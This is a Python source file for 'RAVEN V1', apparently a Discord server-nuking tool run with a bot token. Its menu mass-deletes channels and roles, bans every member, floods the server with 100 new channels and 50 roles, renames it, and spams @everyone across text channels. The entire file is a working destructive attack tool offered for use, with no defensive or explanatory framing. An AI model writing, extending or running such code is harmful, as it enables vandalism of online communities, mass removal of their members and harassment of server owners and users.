import requests
import os
import colorama
from colorama import Fore
import json
import time
import threading
from utils import APIutils, randomcolor, randomstr,randomint
colorama.init(True)
terminal = os.get_terminal_size()
spacing = int((terminal.columns / 2 + (45/3)) /2)
banner=f"""{Fore.MAGENTA}
{spacing*" "}┌───────────────────────────────────────────┐
{spacing*" "}│ ██▀███   ▄▄▄    ██▒   █▓▓█████  ███▄    █ │
{spacing*" "}│▓██ ▒ ██▒▒████▄ ▓██░   █▒▓█   ▀  ██ ▀█   █ │
{spacing*" "}│▓██ ░▄█ ▒▒██  ▀█▄▓██  █▒░▒███   ▓██  ▀█ ██▒│
{spacing*" "}│▒██▀▀█▄  ░██▄▄▄▄██▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒│
{spacing*" "}│░██▓ ▒██▒ ▓█   ▓██▒▒▀█░  ░▒████▒▒██░   ▓██░│
{spacing*" "}│░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ │
{spacing*" "}│  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ░  ░░ ░░   ░ ▒░│
{spacing*" "}│  ░░   ░   ░   ▒     ░░     ░      ░   ░ ░ │
{spacing*" "}│   ░           ░  ░   ░     ░  ░         ░ │
{spacing*" "}│                     ░                     │
{spacing*" "}└───────────────────────────────────────────┘    {Fore.LIGHTGREEN_EX}by FVTIHAKAR
"""
token = ""
guid = ""


apiUtils=""
def setup():
    global apiUtils
    global headers
    global token,guid
    config = json.loads(open("config.json","r").read())
    token = config["token"]
    guid = config["guild-id"]
    os.system("title RAVEN V1 by FVTIHAKAR")
    headers = {
        "Authorization": f"Bot {token}"
    }
    
    os.system("clear")
    
    
    apiUtils = APIutils(guid,headers)
    for i in range(5):
        print(f"Preparing system{Fore.LIGHTGREEN_EX}."+("."*(i+1)))
        time.sleep(0.3)
        os.system("clear")
    
    selectionScreen()

def deletechannels():
    l = apiUtils.getChannels()
    for q in l:
        apiUtils.deleteChannel(q["id"])
def banMembers():
    listofmembers = apiUtils.getMembers()
    for x in listofmembers:
        mid = x["user"]["id"]
        username = x["user"]["username"]
        print(f"Banning User : {username}")
        apiUtils.banMember(mid)



def spamEveryOne():
    r = apiUtils.getChannels()
    for q in r:
        if q["type"] == 0:
            for i in range(5):
                apiUtils.sendMessage(q["id"],"@everyone")
        else:
            pass
def createchannels():
    for i in range(50):
        data={
            "name": f"RAVEN {i+1}",
            "type": 0
        }
        apiUtils.createChannel(data)
    for i in range(50):
        data={
            "name": f"RAVEN {i+51}",
            "type": 2
        }
        apiUtils.createChannel(data)
def setServerName():
    apiUtils.setServerName("RAVEN")

def deleteRoles():
    res = apiUtils.getRoles()
    for x in res:
        apiUtils.deleteRole(x["id"])
    
def createRoles():
    for i in range(50):
        data={
            "name": f"RAVEN {randomstr(12)}",
            "color": randomcolor()
        }
        apiUtils.createRole(data)
    

def selectionScreen():
    while True:
        global selection
        print(banner)
        print("\n")
        print(f"{Fore.CYAN}1) Delete channels     2) Ban members     3) create channels")
        print(f"{Fore.LIGHTGREEN_EX}4) Set Server Name     5) Spam Everyone   6) create Roles   ")
        print(f"{Fore.LIGHTMAGENTA_EX}7) Delete Roles        8) Exit   ")
        selection = int(input("> "))
        if(selection == 1):
            t = threading.Thread(target=deletechannels,daemon=True)
            t.start()
        
        if(selection == 2):
            t = threading.Thread(target=banMembers,daemon=True)
            t.start()
        
        if(selection == 3):
            t = threading.Thread(target=createchannels,daemon=True)
            t.start()

        if(selection == 4):
            t = threading.Thread(target=setServerName,daemon=True)
            t.start()

        if(selection == 5):
            t = threading.Thread(target=spamEveryOne,daemon=True)
            t.start()

        if(selection == 6):
            t = threading.Thread(target=createRoles,daemon=True)
            t.start()

        if(selection == 7):
            t = threading.Thread(target=deleteRoles,daemon=True)
            t.start()

        if(selection == 8):
            exit()
        else:
            pass
        #os.system("clear")
setup()